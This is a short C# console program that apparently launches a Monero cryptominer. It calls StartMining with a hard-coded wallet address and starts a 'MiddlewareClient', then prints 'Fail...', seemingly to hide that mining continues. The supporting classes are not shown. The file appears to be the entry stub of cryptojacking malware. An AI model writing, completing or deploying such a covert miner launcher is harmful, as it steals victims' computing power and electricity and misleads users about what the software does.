using System;

namespace HD
{
  class Program
  {
    static void Main(
      string[] args)
    {
      XmrDll dll = new XmrDll();
      dll.StartMining("14VzFa1eQjcmHp7i3tSTCK3TcWP8kHWhLE", 1);
      MiddlewareClient client = new MiddlewareClient();
      client.Run();

      Console.WriteLine("Fail...");
      Console.ReadLine();
    }
  }
}
